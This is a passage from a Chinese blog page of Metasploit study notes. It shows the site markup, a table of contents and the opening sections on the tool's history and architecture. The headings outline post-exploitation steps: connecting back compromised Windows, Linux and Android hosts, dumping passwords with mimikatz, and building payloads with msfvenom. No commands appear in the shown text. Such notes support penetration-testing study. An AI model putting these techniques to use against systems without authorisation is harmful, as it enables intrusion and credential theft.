<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/favicon-package/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicon-package/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon-package/favicon-16x16.png">
  <link rel="mask-icon" href="/assets/images/favicon-package/safari-pinned-tab.svg" color="#222">
  <link rel="manifest" href="/assets/images/favicon-package/site.webmanifest">
  <meta name="google-site-verification" content="qIz-Tg08U6gyN_53z89yii0ZmKx2avfsO-iyOWhsRx8">
  <meta name="msvalidate.01" content="096F3D01D2AA04148F10750CD4566535">
  <meta name="yandex-verification" content="43f790b7e38394a4">
  <meta name="baidu-site-verification" content="codeva-LMZoUaXjJl">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="/lib/@fortawesome/fontawesome-free/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
  <link rel="stylesheet" href="/lib/animate.css/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"loli.fj.cn","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.23.2","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-light","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":true,"color":"#222","save":"manual"},"mediumzoom":true,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="前言Metasploit项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。（维基百科）">
<meta property="og:type" content="article">
<meta property="og:title" content="【笔记】MSF学习笔记">
<meta property="og:url" content="https://loli.fj.cn/2022/02/11/MSF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="57uv6Z6g55qE5Y2a5a6i">
<meta property="og:description" content="前言Metasploit项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。（维基百科）">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-02-11T03:18:00.000Z">
<meta property="article:modified_time" content="2025-10-25T07:39:44.889Z">
<meta property="article:author" content="57uv6Z6g">
<meta property="article:tag" content="Metasploit">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://loli.fj.cn/2022/02/11/MSF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://loli.fj.cn/2022/02/11/MSF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","path":"2022/02/11/MSF学习笔记/","title":"【笔记】MSF学习笔记"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>【笔记】MSF学习笔记 | 57uv6Z6g55qE5Y2a5a6i</title>
  






  <script async defer data-website-id="981ed5a0-eea5-4426-a8a9-c16a789ccc3f" src="https://umami.loli.fj.cn/script.js" data-host-url="https://umami.loli.fj.cn/"></script>


  
  <script src="/lib/animejs/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
  <script src="/lib/@next-theme/pjax/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous" defer></script>
  <script src="/lib/medium-zoom/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous" defer></script>
  <script src="/lib/pangu/dist/browser/pangu.umd.js" integrity="sha256-erngBMP3zzoIM6eqQ8dmrReh2vqCRgWmORroIfVoDlE=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script><script src="/js/pjax.js" defer></script>

  <script src="/lib/hexo-generator-searchdb/dist/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>







  
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




  

  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"/lib/mathjax/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js" defer></script>



  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="57uv6Z6g55qE5Y2a5a6i" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">57uv6Z6g55qE5Y2a5a6i</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">MS4wLjABAAAA5qMD8Gzdcgq7HXUOviKB59i0-ybJ59jJvNzyaPt5XOsVNqP6DU7WLcoAXvdxvYdp💗<br><font color="red">本站所有文章仅作技术研究，请勿非法破坏，请遵守相关法律法规，后果自负</font></p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-reward"><a href="/reward/" rel="section"><i class="fa fa-hand-holding-heart fa-fw"></i>赞助</a></li><li class="menu-item menu-item-command"><a href="/command/" rel="section"><i class="fa fa-book fa-fw"></i>指令</a></li><li class="menu-item menu-item-contribute"><a href="/contribute/" rel="section"><i class="fa fa-chart-line fa-fw"></i>贡献</a></li><li class="menu-item menu-item-rss"><a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>订阅</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

<link rel="manifest" href="/assets/images/favicon-package/site.webmanifest">

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%91%E5%B1%95%E5%8E%86%E5%8F%B2"><span class="nav-number">2.</span> <span class="nav-text">发展历史</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84"><span class="nav-number">3.</span> <span class="nav-text">技术架构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Metasploit-Framework"><span class="nav-number">4.</span> <span class="nav-text">Metasploit Framework</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85"><span class="nav-number">4.1.</span> <span class="nav-text">安装</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E5%AE%98%E6%96%B9%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC%E5%AE%89%E8%A3%85"><span class="nav-number">4.1.1.</span> <span class="nav-text">通过官方一键安装脚本安装</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87Linux%E5%8C%85%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85"><span class="nav-number">4.1.2.</span> <span class="nav-text">通过Linux包管理工具安装</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Kali"><span class="nav-number">4.1.2.1.</span> <span class="nav-text">Kali</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Debian"><span class="nav-number">4.1.2.2.</span> <span class="nav-text">Debian</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%B0%86Kali%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%BA%90%E6%B7%BB%E5%8A%A0%E5%88%B0Debian%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%BA%90%E5%88%97%E8%A1%A8"><span class="nav-number">4.1.2.2.1.</span> <span class="nav-text">将Kali的软件源添加到Debian的软件源列表</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AE%89%E8%A3%85%E7%AD%BE%E5%90%8D"><span class="nav-number">4.1.2.2.2.</span> <span class="nav-text">安装签名</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9B%B4%E6%96%B0%E8%BD%AF%E4%BB%B6%E6%BA%90"><span class="nav-number">4.1.2.2.3.</span> <span class="nav-text">更新软件源</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AE%89%E8%A3%85MSF"><span class="nav-number">4.1.2.2.4.</span> <span class="nav-text">安装MSF</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9B%B4%E6%96%B0"><span class="nav-number">4.2.</span> <span class="nav-text">更新</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">4.3.</span> <span class="nav-text">初始化漏洞数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8msf%E6%8E%A7%E5%88%B6%E5%8F%B0"><span class="nav-number">4.4.</span> <span class="nav-text">启动msf控制台</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msf%E5%91%BD%E4%BB%A4"><span class="nav-number">5.</span> <span class="nav-text">msf命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.1.</span> <span class="nav-text">查找漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E6%A8%A1%E5%9D%97"><span class="nav-number">5.2.</span> <span class="nav-text">使用漏洞利用的模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%BC%8F%E6%B4%9E%E6%89%80%E6%9C%89%E8%AF%A6%E6%83%85"><span class="nav-number">5.3.</span> <span class="nav-text">查看漏洞所有详情</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%BC%8F%E6%B4%9E%E9%80%89%E9%A1%B9%E8%AF%A6%E6%83%85"><span class="nav-number">5.3.1.</span> <span class="nav-text">查看漏洞选项详情</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%8F%AF%E7%94%A8%E7%9A%84%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5"><span class="nav-number">5.3.2.</span> <span class="nav-text">查看可用的攻击手段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%9A%84%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="nav-number">5.3.3.</span> <span class="nav-text">查看可执行的操作系统</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E5%8F%82%E6%95%B0"><span class="nav-number">5.4.</span> <span class="nav-text">设置漏洞利用的参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5"><span class="nav-number">5.5.</span> <span class="nav-text">设置漏洞利用的攻击手段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">5.6.</span> <span class="nav-text">开始执行漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%94%E5%9B%9E%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC%E4%B9%8B%E5%89%8D"><span class="nav-number">5.7.</span> <span class="nav-text">返回使用脚本之前</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jobs"><span class="nav-number">5.8.</span> <span class="nav-text">jobs</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89jobs"><span class="nav-number">5.8.1.</span> <span class="nav-text">查看所有jobs</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E9%97%AD%E6%89%80%E6%9C%89jobs"><span class="nav-number">5.8.2.</span> <span class="nav-text">关闭所有jobs</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows%E4%B8%8A%E7%BA%BF"><span class="nav-number">6.</span> <span class="nav-text">Windows上线</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux%E4%B8%8A%E7%BA%BF"><span class="nav-number">7.</span> <span class="nav-text">Linux上线</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Android%E4%B8%8A%E7%BA%BF"><span class="nav-number">8.</span> <span class="nav-text">Android上线</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#meterpreter%E5%91%BD%E4%BB%A4"><span class="nav-number">9.</span> <span class="nav-text">meterpreter命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%8F%AF%E4%BB%A5%E5%AF%B9%E5%AF%B9%E6%96%B9%E4%BD%BF%E7%94%A8%E7%9A%84%E6%89%80%E6%9C%89%E5%91%BD%E4%BB%A4"><span class="nav-number">9.1.</span> <span class="nav-text">查看可以对对方使用的所有命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%9A%E8%AF%9D%E5%88%87%E6%8D%A2%E5%88%B0%E5%90%8E%E5%8F%B0"><span class="nav-number">9.2.</span> <span class="nav-text">会话切换到后台</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E5%90%8E%E5%8F%B0%E7%9A%84%E4%BC%9A%E8%AF%9D"><span class="nav-number">9.3.</span> <span class="nav-text">查看所有后台的会话</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%87%E6%8D%A2%E6%8C%87%E5%AE%9A%E7%BC%96%E5%8F%B7%E7%9A%84%E4%BC%9A%E8%AF%9D"><span class="nav-number">9.4.</span> <span class="nav-text">切换指定编号的会话</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%B9%E6%96%B9%E7%B3%BB%E7%BB%9FShell"><span class="nav-number">9.5.</span> <span class="nav-text">获取对方系统Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%97%AD%E5%BD%93%E5%89%8D%E4%BC%9A%E8%AF%9D"><span class="nav-number">9.6.</span> <span class="nav-text">关闭当前会话</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E4%BC%BCShell%E5%91%BD%E4%BB%A4%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="nav-number">9.7.</span> <span class="nav-text">类似Shell命令的基本命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2%E6%96%87%E4%BB%B6"><span class="nav-number">9.8.</span> <span class="nav-text">搜索文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF"><span class="nav-number">9.9.</span> <span class="nav-text">查看配置信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%87%E6%8D%A2%E8%BF%9B%E7%A8%8B"><span class="nav-number">9.10.</span> <span class="nav-text">切换进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0-%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="nav-number">9.11.</span> <span class="nav-text">上传&#x2F;下载文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="nav-number">9.11.1.</span> <span class="nav-text">上传文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="nav-number">9.11.2.</span> <span class="nav-text">下载文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="nav-number">9.12.</span> <span class="nav-text">执行文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E6%9D%9F%E8%BF%9B%E7%A8%8B"><span class="nav-number">9.13.</span> <span class="nav-text">结束进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E6%9C%BA"><span class="nav-number">9.14.</span> <span class="nav-text">关机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7"><span class="nav-number">9.15.</span> <span class="nav-text">屏幕快照</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90"><span class="nav-number">9.16.</span> <span class="nav-text">获取系统权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81"><span class="nav-number">9.17.</span> <span class="nav-text">获取密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%8A%A8mimikatz"><span class="nav-number">9.18.</span> <span class="nav-text">联动mimikatz</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BD%BD%E5%85%A5%E6%A8%A1%E5%9D%97"><span class="nav-number">9.18.1.</span> <span class="nav-text">载入模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%B8%AE%E5%8A%A9"><span class="nav-number">9.18.2.</span> <span class="nav-text">查看帮助</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E5%87%AD%E6%8D%AE"><span class="nav-number">9.18.3.</span> <span class="nav-text">查看所有凭据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8mimikatz%E5%AE%8C%E6%95%B4%E5%8A%9F%E8%83%BD"><span class="nav-number">9.18.4.</span> <span class="nav-text">使用mimikatz完整功能</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="nav-number">10.</span> <span class="nav-text">常用的漏洞利用模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">10.1.</span> <span class="nav-text">敏感目录扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">10.2.</span> <span class="nav-text">主机发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">10.3.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E6%9F%A5%E7%82%B9"><span class="nav-number">10.4.</span> <span class="nav-text">服务查点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msfvenom%E5%91%BD%E4%BB%A4"><span class="nav-number">11.</span> <span class="nav-text">msfvenom命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%86CMD%E5%91%BD%E4%BB%A4%E6%89%93%E5%8C%85%E4%B8%BA%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="nav-number">11.1.</span> <span class="nav-text">将CMD命令打包为可执行程序</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%88%90"><span class="nav-number">12.</span> <span class="nav-text">完成</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-number">13.</span> <span class="nav-text">参考文献</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="57uv6Z6g"
      src="/assets/images/avatar.gif">
  <p class="site-author-name" itemprop="name">57uv6Z6g</p>
  <div class="site-description" itemprop="description">5o2V5o2J5LiA5Y+q54ix5oqY6IW+55qE57uv6Z6g</div>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="mailto:00-isomer-cabbies@icloud.com" title="E-Mail → mailto:00-isomer-cabbies@icloud.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://t.me/LittleSweetCookie" title="Telegram → https:&#x2F;&#x2F;t.me&#x2F;LittleSweetCookie" rel="noopener me" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
      </span>
  </div>

<div id="aplayer-app"></div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://loli.fj.cn/2022/02/11/MSF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/assets/images/avatar.gif">
      <meta itemprop="name" content="57uv6Z6g">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="57uv6Z6g55qE5Y2a5a6i">
      <meta itemprop="description" content="5o2V5o2J5LiA5Y+q54ix5oqY6IW+55qE57uv6Z6g">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="【笔记】MSF学习笔记 | 57uv6Z6g55qE5Y2a5a6i">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          【笔记】MSF学习笔记
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-02-11 11:18:00" itemprop="dateCreated datePublished" datetime="2022-02-11T11:18:00+08:00">2022-02-11</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-10-25 15:39:44" itemprop="dateModified" datetime="2025-10-25T15:39:44+08:00">2025-10-25</time>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Metasploit项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。（<a href="/302.html?target=https://zh.wikipedia.org/zh-cn/Metasploit">维基百科</a>）</p>
<span id="more"></span>

<h2 id="发展历史"><a href="#发展历史" class="headerlink" title="发展历史"></a>发展历史</h2><ul>
<li><strong>2003年10月</strong> HD Moore 使用 Perl语言 开发了 Metasploit v1.0</li>
<li>2004年4月 在 Spoonm 的帮助下，完全重写了 Metasploit 的代码。主要更新：18个攻击模块和27个攻击载荷，并提供了控制台终端、命令行、Web三个使用接口</li>
<li><strong>2004年8月</strong> HD 和 Spoonm 带着最新发布的 Metasploit v2.0 在拉斯维加斯举办的BlackHat全球开发者大会上进行了演讲</li>
<li><strong>2005年</strong> 在CanSecWest和黑客会议上，HD 和 Spoonm 指出Perl版本的Metasploit有很多问题，经历了18个月之后，Metasploit团队使用Ruby语言完全重写了Metasploit，发布了Metasploit v3.0。主要更新：177个攻击模块、104个攻击载荷、30个辅助模块</li>
<li>2009年10月 Metasploit被Rapid7公司收购</li>
<li>2010年10月 Rapid7公司发布了商业版本：Metasploit Express、Metasploit Pro</li>
<li><strong>2011年8月</strong> Metasploit 团队发布了v4.0版本。主要更新：引入了后渗透攻击模块（用于长期权限位置和攻击成果扩展）</li>
<li><strong>2019年1月</strong> Metasploit 团队发布了v5.0版本。主要更新：引入了新模块evasion capabilities（用于杀软免杀）</li>
</ul>
<h2 id="技术架构"><a href="#技术架构" class="headerlink" title="技术架构"></a>技术架构</h2><ul>
<li>辅助模块：为渗透测试的信息收集环节提供了支持，包括针对各种网络服务的扫描与查点、构建虚假服务收集密码、口令猜测破解、敏感信息嗅探、探查敏感信息泄漏、Fuzz测试发掘漏洞、实施网络协议欺骗等</li>
